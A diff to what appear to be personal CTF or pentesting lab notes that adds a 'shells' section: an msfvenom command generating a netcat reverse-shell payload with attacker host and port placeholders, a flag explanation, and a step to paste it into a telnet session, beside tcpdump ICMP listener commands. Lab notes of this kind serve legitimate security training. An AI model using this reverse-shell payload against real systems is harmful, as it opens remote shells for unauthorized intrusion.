@@ -34,9 +34,27 @@
 ### Exploiting
 * telnet [ip] [port]
 
-# other Important 
-## Start a tcpdump listener
+
+# shells 
+## Simple Shell msfvenom 
+
+
+```
 If using your own machine with the OpenVPN connection, use:
 sudo tcpdump ip proto \\icmp -i tun0
 If using the AttackBox, use:
 sudo tcpdump ip proto \\icmp -i ens5
+
+
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+copy and paste the value on telnet session 
+```
+
+
+# other Important 
+## Start a tcpdump listener
+
